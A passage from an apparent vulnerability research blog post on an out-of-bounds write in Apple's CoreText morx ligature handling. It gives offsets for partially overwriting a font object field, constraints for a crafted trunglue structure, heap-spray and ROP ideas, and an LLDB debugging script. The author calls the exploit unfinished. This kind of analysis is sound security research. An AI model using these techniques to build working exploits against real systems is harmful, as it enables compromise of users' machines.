  objc_msgSend_ptr(glyph_storage, (const char *)off_7FFF809BA6D0, v6);  // [_CTNativeGlyphStorage customAdvanceForIndex:]
  ...
  }
  

So, if we can make `v7=false`, then the vtable call won’t happen. This is done by setting the byte at offset `0x21` of the `TStorageRange` structure to satisfy `(byte21 & 4) != 0`.

But in the end, it doesn’t even matter. This is so stupid. It tries to call the `customAdvanceForIndex` method of this Obj-C object, but `CTNativeGlyphStorage` doesn’t have a `customAdvanceForIndex` method. As a result, the program crashes if it goes the `else` path. I think the devs forgot to define this method…

### Exploitation steps

With the current knowledge, we can only overwrite `tfont->in_memory_base_font` by 2 bytes. It is not too bad, but not very good either. But maybe if we have some useful address infoleaks, exploitation is possible.

To set `tfont->in_memory_base_font`, use `location = -0x5b0+0x160 = -0x450`. a. As shown in the statistics earlier, `-0x5b0` is most likely the offset from `glyphs` to `tfont`. b. The `in_memory_base_font` field is at offset `0x160`. c. Need at least 4 iterations to overwrite at offset `-0x450`, `-0x450+2`, `-0x450+4`, `-0x450+6`. d. In the exploit, set `location` to `-0x450/2 = 0xfffffffffffffdd8`. Dividing by 2 because remember that our OOB write is on a `WORD*`, so each `index` will be multiplied by 2.

For each write iteration, the OOB write value is taken from the ligature list table in the poc font file, from offset `0x3D724` onwards.

Take note, recall that we control 2 things in each iteration: `&trunglue` and `location`. There are some constraints for `&trunglue` that are easy to meet, i.e. `trunglue->glyphs[trunglue->encoded_index + location]` must not make the program crash.

  * `trunglue->encoded_index` (`*trunglue + 0xa0`) should ideally be small, as close to 0 as possible.
  * `trunglue->glyphs` (`*trunglue + 0xb0`) must be a mapped address
  * for each `location` value needed in the exploit, make sure that `trunglue->glyphs[trunglue->encoded_index + location]` is as small as possible: 
  * because it is used to determine the index for the component table
  * if the index goes out of bounds of the **morx ligature subtable** then the **ligature actions** loop will break

If we have an address infoleak, then it should be simple to create a custom trunglue structure somewhere that satisfies these constraints.

#### Breaking at the right time

Now, the exploit will create 128 canvases and draw text to them. So, wherever I set a breakpoint, it will be triggered thousands of times. I am only interested in the breakpoints after `stack_top` is set to `0x7ffe0`, because that is when we can start to do the OOB write. So, I wrote a LLDB command that will set a breakpoint at where I want, and keep continuing until a certain register contains a certain value.
  
  
  # continue until the value in a register is a specifc value
  def cmd_ctil(debugger, command, result, _dict):
  def eee(cmd):
  res = lldb.SBCommandReturnObject()
  debugger.GetCommandInterpreter().HandleCommand(cmd, res)
  
  def reg(r):
  return int(str(get_frame().reg[r].value), 16)
  
  args = command.split(' ')
  if len(args) != 4:
  print("ctil <break module> <break address in ida> <reg name> <reg value>")
  return
  
  module_name = args[0]
  bp_addr = args[1]
  reg_name = args[2]
  reg_value = args[3]
  if reg_value[:2] == "0x":
  reg_value = int(reg_value, 16)
  else:
  reg_value = int(reg_value)
  
  eee("bpd")
  eee(f"mbp {module_name} {bp_addr}")
  
  global CONFIG_NO_CTX
  CONFIG_NO_CTX = 1
  while True:
  eee("c")
  rdx = reg(reg_name)
  print(hex(rdx), end=" ")
  if rdx == reg_value:
  break
  
  CONFIG_NO_CTX = 0
  
  # continue until stack_top = 0x7ffe0
  def cmd_cc(debugger, command, result, _dict):
  def eee(cmd):
  res = lldb.SBCommandReturnObject()
  debugger.GetCommandInterpreter().HandleCommand(cmd, res)
  
  eee("ctil CoreText 00007FFF21984B16 rdx 0x7ffe0")  # morx_ligature_state->tglyphs[stack_top].trunglue
  eee("bpd")
  eee("mbp CoreText 00007FFF21968262")  # glyphs[index] = ligature_offset
  eee("mbp CoreText 00007FFF2193D094")  # vtable call
  

I now can just enter `cc` in LLDB and it will continue to the point where `stack_top == 0x7ffe0` at `morx_ligature_state->tglyphs[stack_top].trunglue`, then set a breakpoint at `glyphs[index] = ligature_offset` and the vtable call to do my debugging. This command probably takes 15-20 seconds to run because there are 128 canvases that will draw stuff.

### Some other ideas to explore

Here are some other ideas that I haven’t tried.

  1. Fill up the holes in the heap with a better way. Currently I just make 128 canvases but this is not very good.
  2. Spray the heap with something (I am not sure at this point of time what it is) so that 2-byte partial overwrite works reliably.

If we manage to get address of the heap and the stack, then we can very inconveniently do ROP. But CANARY needs to be fixed first. Maybe with an infoleak, there can be more ideas too.

If you got this far in the post, you probably know much more than me. To finish, yes, exploiting this issue is beyond me for the time being. If anyone can enlighten me, please leave us a note or DM me.

### References

  * <https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6Tables.html>
  * <https://starlabs.sg/blog/2021/09-analysis-of-cve-2021-1758/>
  * <https://nusgreyhats.org/posts/writeups/basic-lldb-scripting/>
  * <https://developer.apple.com/fonts/TrueType-Reference-Manual/RM02/Chap2.html>
  * <http://phrack.org/issues/70/3.html>
  * <https://huhong789.github.io/advanced-DOP/>
  * <https://osxdaily.com/2014/09/10/show-process-id-page-title-safari-mac-osx/>
